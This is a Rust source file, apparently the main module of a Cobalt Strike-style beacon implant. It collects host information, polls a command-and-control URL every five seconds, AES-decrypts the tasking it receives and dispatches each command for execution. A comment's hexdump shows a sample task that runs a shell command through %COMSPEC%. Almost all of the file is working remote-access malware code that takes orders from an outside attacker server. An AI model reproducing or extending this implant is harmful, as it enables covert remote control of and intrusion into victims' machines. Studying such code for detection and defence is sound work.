#![allow(internal_features)]
#![feature(c_variadic)]
#![feature(core_intrinsics)]

use std::io::{Cursor, Write};
use std::sync::atomic::AtomicU32;
use std::sync::LazyLock;

// use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use byteorder::{ReadBytesExt, WriteBytesExt, BE};
// use sha2::Sha256;
use rsa::{pkcs8::DecodePublicKey, PublicKey};
use sha2::Digest;

use config::{C2_GET_URL, USER_AGENT};

use crate::beacon::init::Beacon;
use crate::util::crypt::aes_decrypt;
use crate::util::data_parse::{beacon_read_bytes, beacon_read_i32};
use crate::util::jobs::command_handle;
use crate::util::strike::Strike;

mod beacon;
mod config;
mod util;

static BEACON: LazyLock<Beacon> = LazyLock::new(|| Beacon::init());
// static mut COUNTER: u32 = 1u32;
static COUNTER: AtomicU32 = AtomicU32::new(0);

fn main() {
    let cookie = BEACON
        .collect_info()
        .unwrap_or_else(|_| panic!("collect info error"));
    // let mut COUNTER = 1u32;
    println!("starting connect to {}", C2_GET_URL);
    loop {
        let http_res = Strike::http_get(C2_GET_URL, &cookie, USER_AGENT);
        if let Ok(res) = http_res {
            let content_length = res.content_length().unwrap() as usize;
            // continue;
            if content_length > 0 {
                println!("get response with size={}", content_length);
                let content = res.bytes().unwrap();
                // let hmac_hash = &content[content_length - 16..];
                let rest_bytes = &content[..content_length - 16];
                let iv = b"abcdefghijklmnop";
                let decrypted = aes_decrypt(rest_bytes, &BEACON.aes_key, iv).unwrap();
                hexdump::hexdump(&decrypted);
                let mut decrypted_cursor = Cursor::new(decrypted);
                // |634bfc59 00000026 0000004e 0000001e| cK.Y...&...N.... 00000000
                // |00000009 25434f4d 53504543 25000000| ....%COMSPEC%... 00000010
                // |0b202f43 20697020 61646472 00004141| . /C ip addr..AA 00000020

                let _timestamp = beacon_read_i32(&mut decrypted_cursor).unwrap();
                let _cmd_len1 = beacon_read_i32(&mut decrypted_cursor).unwrap();
                //可能会有多个命令，因此需要循环读取
                //-16是因为命令最后可能会有一些无用的填充字段，进行跳过
                while (decrypted_cursor.position() as usize) < decrypted_cursor.get_ref().len() - 16
                {
                    let cmd_type = decrypted_cursor.read_u32::<BE>().unwrap();
                    let cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
                    let cmd_buf =
                        beacon_read_bytes(&mut decrypted_cursor, cmd_len as usize).unwrap();
                    // 创建一个新的Cursor
                    let mut cmd = Cursor::new(Vec::new());
                    // 写入cmd_len（大端序）
                    cmd.write_i32::<BE>(cmd_len).unwrap();
                    // 写入content
                    cmd.write_all(&cmd_buf).unwrap();
                    // 将Cursor的位置重新设置为开始
                    cmd.set_position(0);

                    // 处理命令
                    command_handle(cmd_type, cmd);
                }
            } else {
                println!("heartbeat..")
            }
        } else {
            println!("http error: {:?}", http_res.err())
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
